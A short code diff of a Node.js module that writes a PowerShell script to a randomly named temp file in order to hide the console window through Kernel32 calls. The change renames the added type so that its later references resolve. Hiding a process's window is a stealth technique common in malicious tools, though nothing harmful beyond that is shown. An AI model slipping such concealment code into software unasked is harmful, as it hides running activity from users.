@@ -7,7 +7,7 @@ const program = require('./../../utils/program/program.js');
 
 module.exports = async () => {
     const powershellScript = `
-        Add-Type -Name ConsoleWindow -Namespace Console -MemberDefinition '
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
         [DllImport("Kernel32.dll")]
         public static extern IntPtr GetConsoleWindow();
 
@@ -18,7 +18,6 @@ module.exports = async () => {
         $consoleHandle = [Console.Window]::GetConsoleWindow()
         [Console.Window]::ShowWindow($consoleHandle, 0)
     `;
-
 
     const tempFile = path.join(os.tmpdir(), `${program.randString(10)}.ps1`);
     fs.writeFileSync(tempFile, powershellScript);
